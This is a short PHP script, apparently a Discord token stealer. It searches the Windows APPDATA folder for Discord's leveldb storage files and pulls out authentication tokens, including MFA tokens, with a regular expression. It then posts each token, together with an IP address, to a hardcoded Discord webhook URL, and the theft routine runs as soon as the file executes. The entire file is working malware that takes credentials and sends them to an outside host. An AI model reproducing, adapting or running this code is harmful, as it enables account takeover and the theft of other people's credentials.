<?php

function grab_ip() {
    // this doesn't certainly return the ip but idk another way
    return $_SERVER['REMOTE_ADDR'];
}

function get_discord_folders() {
    $discord_folders = new ArrayObject(array());
    $appdata = getenv("APPDATA");
    $dirs = scandir($appdata);
    foreach ($dirs as $directory) {
        if (strpos($directory, "discord") !== false) {
            $discord_folders->append("$appdata\\$directory");
        }
    }
    return $discord_folders;
}

function get_ldb_files() {
    $discord_ldb = new ArrayObject(array());
    $directories = get_discord_folders();
    foreach ($directories as $hi) {
        $dirs = scandir("$hi\\");
        foreach ($dirs as $poop) {
            if (strpos($poop, 'Local Storage') !== false) {
                $path = scandir("$hi\\$poop\\leveldb");
                foreach ($path as $ldb) {
                    if (strpos($ldb, ".ldb") !== false) {
                        $discord_ldb->append("$hi\\$poop\\leveldb\\$ldb");
                    }
                }
            }
        }
    }
    return $discord_ldb;
}

function grab_tokens() {
    $ldb = get_ldb_files();
    $ip = grab_ip();
    $discord_hook = "https://discord.com/api/webhooks/794240426298572880/Wjmf_KX1E3Jsv-kDxz1JXQUEOQW9HCPYMA7898DiT2SWRizgORq7KuGChQ51vnUjCrjI";
    $token_regex = "/[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}|mfa\.[a-zA-Z0-9_\-]{84}/";
    foreach ($ldb as $lol) {
        $file = fopen($lol, "r");
        if (preg_match($token_regex, fread($file, filesize($lol)), $match)) {
            foreach ($match as $token) {
                $payload = array(

                    "content" => "
                    ```asciidoc
ip :: $ip
token :: $token
```
                    "
                );
                $options = array(
                    "http" => array(
                        "header" => "Content-Type: application/json\r\n",
                        "method" => "POST",
                        "content" => json_encode($payload)
                    )
                );
                $context  = stream_context_create($options);
                file_get_contents($discord_hook, false, $context);
            }
        }
    }
}

grab_tokens();